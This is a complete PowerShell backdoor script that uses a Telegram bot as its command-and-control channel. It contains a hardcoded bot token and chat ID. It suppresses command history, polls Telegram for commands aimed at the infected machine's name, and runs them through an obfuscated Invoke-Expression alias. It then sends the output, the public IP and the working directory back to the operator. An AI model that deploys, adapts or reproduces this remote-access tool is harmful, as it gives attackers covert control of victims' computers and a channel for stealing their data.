Clear-Host
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Set-Location -Path $env:USERPROFILE

$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$telegram_id, $api_token    = "2118389773", "8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0"
$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
$api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
$session_id                 = $env:COMPUTERNAME
$Global:ProgressPreference  = 'SilentlyContinue'

$script:cached_ip    = "N/A"
$script:cached_ip_at = [DateTime]::MinValue

function GetPublicIP {
    if (((Get-Date) - $script:cached_ip_at).TotalMinutes -gt 5) {
        try {
            $script:cached_ip    = Invoke-RestMethod -Uri "ident.me" -TimeoutSec 3 -WebSession $session
            $script:cached_ip_at = Get-Date
        } catch { }
    }
    return $script:cached_ip
}

function EscapeMd($text) {
    if ($null -eq $text) { return "" }
    return [regex]::Replace([string]$text, '([`\\])', '\$1')
}

function SendMessage($output, $cmd) {
    $ip   = EscapeMd (GetPublicIP)
    $sid  = EscapeMd $session_id
    $path = EscapeMd ((Get-Location).Path.Replace('\','/'))
    $c    = EscapeMd $cmd
    $o    = EscapeMd $output

    $MessageToSend = @{
        chat_id    = $telegram_id
        parse_mode = "MarkdownV2"
        text       = "``$sid```n```````nIP: $ip`nPATH: [$path]`nCMD: $c`n`n$o`n``````"
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
    } catch { Start-Sleep -Seconds 3 }
}

function CommandListener {
    $offset = 0
    try {
        $init = Invoke-RestMethod -Method Get -Uri "$api_get_updates`?timeout=0" -WebSession $session
        if ($init.result.Count -gt 0) { $offset = $init.result[-1].update_id + 1 }
    } catch { }

    SendMessage "Sesja aktywna!" ""

    while ($true) {
        try {
            $resp = Invoke-RestMethod -Method Get -Uri "$api_get_updates`?timeout=30&offset=$offset" -WebSession $session -TimeoutSec 35

            foreach ($update in $resp.result) {
                $offset = $update.update_id + 1
                $msg    = $update.message
                if (-not $msg) { continue }

                if ([string]$msg.chat.id -ne $telegram_id) { continue }

                $text = $msg.text
                if (-not $text) { continue }

                $parts  = $text -split ' ', 2
                $target = $parts[0]
                $cmd    = if ($parts.Count -gt 1) { $parts[1] } else { '' }

                if ($cmd -match '/online')         { SendMessage "Sesja aktywna" $cmd; continue }
                if ($target -notmatch $session_id) { continue }
                if ($cmd -eq 'exit')               { SendMessage "Sesja zabita" $cmd; exit }

                if ($cmd.Length -gt 0) {
                    try {
                        $first = ($cmd -split ' ', 2)[0]
                        if ($first -eq 'cd' -or $first -eq 'Set-Location') { $cmd = $cmd + ' -ErrorAction Stop; ls' }
                        $output = .(Get-Alias ?e[?x])($cmd) | Out-String
                    } catch { $output = $Error[0] | Out-String }

                    if ([string]::IsNullOrWhiteSpace($output)) {
                        SendMessage ("Polecenie wykonane: " + $cmd) $cmd
                    } else {
                        for ($i = 0; $i -lt $output.Length; $i += 4000) {
                            $chunk = $output.Substring($i, [Math]::Min(4000, $output.Length - $i))
                            SendMessage $chunk $cmd
                            Start-Sleep -Milliseconds 100
                        }
                    }
                }
            }
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}

CommandListener
